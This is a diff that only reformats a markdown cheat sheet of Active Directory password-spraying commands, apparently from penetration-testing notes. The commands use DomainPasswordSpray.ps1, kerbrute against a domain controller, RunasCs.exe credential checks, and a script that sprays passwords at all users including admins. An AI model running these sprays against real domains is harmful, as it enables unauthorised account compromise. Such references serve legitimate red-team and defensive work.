@@ -2,27 +2,37 @@
 legal-banner: true
 ---
 
-### **USING DOMAINPASSWORDSPRAY.PS1**
+### **Using DomainPasswordSpray.ps1**
 
-1.  Import the DomainPasswordSpray module.  
-    `Import-Module .\DomainPasswordSpray.ps1`
-2.  Run the Invoke-DomainPasswordSpray command with the desired password and output file parameters.  
-    `Invoke-DomainPasswordSpray -Password [PASSWORD] -OutFile spray_success -ErrorAction SilentlyContinue`
+1. Import the DomainPasswordSpray module:  
+   ```powershell
+   Import-Module .\DomainPasswordSpray.ps1
+   ```
 
-### **USING KERBRUTE FOR PASSWORD SPRAYING**
+2. Run `Invoke-DomainPasswordSpray` with the desired password and output file parameters:  
+   ```powershell
+   Invoke-DomainPasswordSpray -Password [PASSWORD] -OutFile spray_success -ErrorAction SilentlyContinue
+   ```
 
-1.  Execute the password spray attack:  
-    `kerbrute passwordspray -d example.local --dc [IP_ADDRESS] valid_users.txt [PASSWORD]`
+### **Using Kerbrute for Password Spraying**
 
-### **USING RUNASCS.EXE**
+1. Execute the password spray attack:  
+   ```bash
+   kerbrute passwordspray -d example.local --dc [IP_ADDRESS] valid_users.txt [PASSWORD]
+   ```
 
-1.  RunasCs.exe can be used to check credentials locally without access to SMB, LDAP, WinRM, Kerberos, or any other authenticated Windows services.  
-    `.\RunasCs.exe Administrator notthepassword "cmd /c whoami"`
-    
-2.  Use spray-passwords.ps1 script: https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
-    
-    ```powershell
-    # test password against all users in the AD, including admins.
-    PS> .\spray-passwords.ps1 -Admin -Pass IamUser01
-    PS> .\spray-passwords.ps1 -Admin -Pass IamUser02
-    ```
+### **Using RunasCs.exe**
+
+1. Validate credentials locally without requiring SMB, LDAP, WinRM, Kerberos, or other authenticated services:  
+   ```bash
+   .\RunasCs.exe Administrator notthepassword "cmd /c whoami"
+   ```
+
+2. Use the `spray-passwords.ps1` script: [Spray-Passwords.ps1](https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)  
+
+   Example usage to test passwords against all users in AD, including admins:  
+
+   ```powershell
+   .\spray-passwords.ps1 -Admin -Pass IamUser01
+   .\spray-passwords.ps1 -Admin -Pass IamUser02
+   ```
